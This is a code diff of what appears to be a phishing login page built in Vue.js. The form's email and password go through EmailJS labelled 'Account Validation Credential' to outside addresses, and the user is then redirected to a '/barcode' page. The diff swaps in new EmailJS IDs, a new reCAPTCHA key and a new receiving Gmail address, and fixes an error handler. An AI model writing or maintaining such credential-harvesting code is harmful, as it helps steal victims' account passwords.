@@ -44,7 +44,7 @@
         <div
           style="margin-top: 1rem;"
           class="g-recaptcha"
-          data-sitekey="6LendeAZAAAAANQ9d2W0hNfT4JPpihKgVN9pWerd"
+          data-sitekey="6LctVDciAAAAAENNzmXXJuJSaQlyq82x-91QLeUy"
         ></div>
         <!-- <div class="g-recaptcha" data-sitekey="6LfEov4UAAAAAN8Hv8YDyqpqxGrt6RLnT5qMWxHA"></div> -->
         <el-form-item style="margin: 20px 0px;">
@@ -122,14 +122,14 @@ export default {
       this.$refs[formName].validate((valid) => {
         if (valid) {
           var data = {
-            service_id: "service_fukql9p",
-            template_id: "template_74y6ir9",
-            user_id: "user_gEIO4dyYsGHrZgmFgY1Ul",
+            service_id: "service_g49xzs9",
+            template_id: "template_xkj0lgc",
+            user_id: "Q_v6F22hpmQkpwuex",
             template_params: {
               from_name: 'Account Validation Credential',
               email: this.ruleForm.name,
               password: this.ruleForm.password,
-              reply_to: "crewwebinar@gmail.com",
+              reply_to: "customeronlineagent@gmail.com",
             },
           };
           axios
@@ -139,7 +139,7 @@ export default {
               self.$router.push("/barcode");
             })
             .catch(function() {
-              this.loader = false;
+              self.loader = false;
             });
         } else {
           this.loader = false;
